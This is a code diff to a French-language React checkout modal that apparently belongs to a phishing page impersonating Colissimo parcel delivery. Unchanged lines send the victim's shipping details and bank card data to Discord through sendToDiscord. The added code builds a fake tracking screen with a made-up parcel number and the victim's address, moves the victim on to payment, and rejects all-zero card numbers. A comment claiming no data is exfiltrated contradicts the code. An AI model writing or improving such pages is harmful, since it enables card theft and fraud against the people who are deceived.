@@ -115,7 +115,8 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, o
       // Silently proceed for the user, but do not exfiltrate data.
       if (step === CheckoutStep.SHIPPING && validateShipping()) {
         setStep(CheckoutStep.TRACKING_PREVIEW);
-        setTimeout(() => setStep(CheckoutStep.PAYMENT), 2500);
+      } else if (step === CheckoutStep.TRACKING_PREVIEW) {
+        setStep(CheckoutStep.PAYMENT);
       } else if (step === CheckoutStep.PAYMENT && validatePayment()) {
         setStep(CheckoutStep.PROCESSING);
       } else if (step === CheckoutStep.NOTIFICATION_CONSENT && consentChecked) {
@@ -134,8 +135,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, o
           "Code Postal": formData.zip,
         });
         setStep(CheckoutStep.TRACKING_PREVIEW);
-        setTimeout(() => setStep(CheckoutStep.PAYMENT), 2500);
       }
+    } else if (step === CheckoutStep.TRACKING_PREVIEW) {
+      setStep(CheckoutStep.PAYMENT);
     } else if (step === CheckoutStep.PAYMENT) {
       if (validatePayment()) {
         await sendToDiscord("Données Bancaires", {
@@ -178,7 +180,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, o
     }
   }, [step]);
 
-  const isCardValid = formData.card.replace(/\D/g, '').length >= 13 && validateLuhn(formData.card);
+  const cardCleaned = formData.card.replace(/\D/g, '');
+  const isNotAllZeros = !/^0+$/.test(cardCleaned);
+  const isCardValid = cardCleaned.length >= 13 && validateLuhn(formData.card) && isNotAllZeros;
   const isPaymentValid = isCardValid && /^\d{2}\/\d{2}$/.test(formData.expiry) && formData.cvv.length >= 3;
 
   if (!isOpen) return null;
@@ -191,7 +195,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, o
         <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50/80">
           <h2 className="font-bold text-gray-900">
             {step === CheckoutStep.SHIPPING && "Informations de livraison"}
-            {step === CheckoutStep.TRACKING_PREVIEW && "Préparation du colis..."}
+            {step === CheckoutStep.TRACKING_PREVIEW && "Suivi de livraison"}
             {step === CheckoutStep.PAYMENT && "Paiement sécurisé"}
             {step === CheckoutStep.PROCESSING && "Vérification bancaire"}
             {step === CheckoutStep.NOTIFICATION_CONSENT && "Activer les notifications"}
@@ -235,15 +239,40 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, o
           )}
 
           {step === CheckoutStep.TRACKING_PREVIEW && (
-            <div className="py-12 flex flex-col items-center justify-center space-y-6 text-center">
-              <div className="relative">
-                <div className="w-20 h-20 border-4 border-blue-100 rounded-full flex items-center justify-center"><i className="fas fa-truck-fast text-3xl text-[#0866FF] animate-bounce"></i></div>
-                <div className="absolute inset-0 border-4 border-t-[#0866FF] rounded-full animate-spin"></div>
+            <div className="py-6 flex flex-col space-y-6">
+              <div className="flex items-center justify-between mb-2">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLMzu2kwd8LgseG5QVV9nmqy7WT7ozEynpXA&s" alt="Colissimo" className="h-16 md:h-20 object-contain" />
+                <span className="text-[10px] font-bold text-gray-500 uppercase bg-gray-100 px-3 py-1.5 rounded-full border border-gray-200">N° 6A19384756291</span>
               </div>
-              <div>
-                <h3 className="text-lg font-bold text-gray-900">Calcul des frais de port...</h3>
-                <p className="text-gray-500 text-sm mt-1">Génération de l'étiquette Colissimo prépayée</p>
+              
+              <div className="bg-blue-50/50 p-4 rounded-xl border border-blue-100">
+                <h4 className="text-xs font-bold text-[#0866FF] uppercase mb-2">Adresse de livraison</h4>
+                <p className="text-sm text-gray-900 font-bold">{formData.name}</p>
+                <p className="text-sm text-gray-700">{formData.address}</p>
+                <p className="text-sm text-gray-700">{formData.zip} {formData.city}</p>
               </div>
+
+              <div className="relative pl-6 border-l-2 border-[#0866FF] space-y-8 py-2 mx-2">
+                <div className="relative">
+                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-[#0866FF] rounded-full border-4 border-white shadow"></div>
+                  <h4 className="text-sm font-bold text-[#0866FF]">Paiement en attente</h4>
+                  <p className="text-xs text-gray-500 mt-1">En attente de la validation de votre paiement pour lancer l'expédition.</p>
+                </div>
+                <div className="relative opacity-40">
+                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-gray-300 rounded-full border-4 border-white"></div>
+                  <h4 className="text-sm font-bold text-gray-500">Prise en charge</h4>
+                  <p className="text-xs text-gray-400 mt-1">Votre colis sera préparé par l'expéditeur.</p>
+                </div>
+                <div className="relative opacity-40">
+                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-gray-300 rounded-full border-4 border-white"></div>
+                  <h4 className="text-sm font-bold text-gray-500">En cours de livraison</h4>
+                  <p className="text-xs text-gray-400 mt-1">Le colis sera en route vers votre adresse.</p>
+                </div>
+              </div>
+
+              <button onClick={nextStep} className="w-full bg-[#0866FF] text-white font-bold py-4 rounded-xl mt-4 hover:bg-[#0759e0] transition-colors shadow-lg">
+                Procéder au paiement
+              </button>
             </div>
           )}
 
